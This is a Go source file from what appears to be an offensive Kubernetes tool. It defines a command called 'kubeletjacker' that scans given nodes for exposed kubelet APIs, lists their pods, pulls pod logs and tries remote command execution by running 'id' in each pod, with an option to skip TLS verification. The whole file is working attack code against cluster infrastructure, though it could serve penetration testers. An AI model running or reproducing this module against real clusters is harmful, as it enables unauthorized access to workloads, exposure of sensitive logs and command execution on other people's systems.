package modules

import (
	"fmt"
	"net/http"
	"strings"
	"time"

	"kubeshadow/pkg/kubelet"
	"kubeshadow/pkg/utils"

	"github.com/spf13/cobra"
)

const (
	// Timeouts for different operations
	listPodsTimeout    = 5 * time.Second
	getLogsTimeout     = 30 * time.Second
	execCommandTimeout = 15 * time.Second
)

// createHTTPClient creates an HTTP client with the specified timeout and transport
func createHTTPClient(timeout time.Duration, transport *http.Transport) *http.Client {
	return &http.Client{
		Timeout:   timeout,
		Transport: transport,
		// Don't follow redirects
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
}

var KubeletJackerCmd = &cobra.Command{
	Use:   "kubeletjacker",
	Short: "Exploit misconfigured or open kubelet APIs for pod access, logs, and potential RCE",
	RunE: func(cmd *cobra.Command, args []string) error {
		nodeList, err := cmd.Flags().GetStringSlice("nodes")
		if err != nil {
			return fmt.Errorf("failed to get nodes flag: %w", err)
		}
		port, err := cmd.Flags().GetString("port")
		if err != nil {
			return fmt.Errorf("failed to get port flag: %w", err)
		}
		insecure, err := cmd.Flags().GetBool("insecure")
		if err != nil {
			return fmt.Errorf("failed to get insecure flag: %w", err)
		}

		var transport *http.Transport
		if insecure {
			fmt.Println("⚠️  Warning: TLS verification is disabled")
			transport = &http.Transport{
				TLSClientConfig: kubelet.InsecureTLS(),
				// Add connection pooling
				MaxIdleConns:        100,
				IdleConnTimeout:     90 * time.Second,
				DisableCompression:  true,
				DisableKeepAlives:   false,
				MaxConnsPerHost:     10,
				MaxIdleConnsPerHost: 10,
			}
		} else {
			transport = &http.Transport{
				TLSClientConfig: kubelet.SecureTLS(),
				// Add connection pooling
				MaxIdleConns:        100,
				IdleConnTimeout:     90 * time.Second,
				DisableCompression:  true,
				DisableKeepAlives:   false,
				MaxConnsPerHost:     10,
				MaxIdleConnsPerHost: 10,
			}
		}

		var probeErrors []error
		for _, node := range nodeList {
			fmt.Printf("\n🔍 Probing node: %s:%s\n", node, port)

			baseURL := fmt.Sprintf("https://%s:%s", node, port)

			// List pods with shorter timeout
			listClient := createHTTPClient(listPodsTimeout, transport)
			pods, err := kubelet.ListPods(listClient, baseURL)
			if err != nil {
				errMsg := fmt.Errorf("failed to list pods on node %s: %w", node, err)
				probeErrors = append(probeErrors, errMsg)
				fmt.Printf("❌ %v\n", errMsg)
				continue
			}

			fmt.Printf("✅ Found %d pods\n", len(pods))

			for _, pod := range pods {
				fmt.Printf("📦 %s/%s\n", pod.Namespace, pod.Name)

				// Try fetching logs with longer timeout
				logsClient := createHTTPClient(getLogsTimeout, transport)
				logs, err := kubelet.GetPodLogs(logsClient, baseURL, pod)
				if err != nil {
					fmt.Printf("⚠️  Could not fetch logs for %s/%s: %v\n", pod.Namespace, pod.Name, err)
				} else if len(logs) > 0 {
					fmt.Printf("🪵 Logs: \n%s\n", utils.TruncateString(logs, 300))
				}

				// Attempt RCE with medium timeout
				execClient := createHTTPClient(execCommandTimeout, transport)
				output, err := kubelet.TryExec(execClient, baseURL, pod, []string{"id"})
				if err != nil {
					fmt.Printf("ℹ️  No exec access for %s/%s: %v\n", pod.Namespace, pod.Name, err)
				} else if strings.Contains(output, "uid") {
					fmt.Println("⚠️  Exec access successful! Potential RCE")
					fmt.Println(output)
				}
			}
		}

		if len(probeErrors) > 0 {
			return fmt.Errorf("probe completed with errors: %v", probeErrors)
		}
		return nil
	},
}

func init() {
	KubeletJackerCmd.Flags().StringSlice("nodes", []string{}, "List of node IPs or hostnames")
	KubeletJackerCmd.Flags().String("port", "10250", "Kubelet port to test (10250 or 10255)")
	KubeletJackerCmd.Flags().Bool("insecure", false, "Disable TLS verification (dangerous)")
	KubeletJackerCmd.MarkFlagRequired("nodes")
}
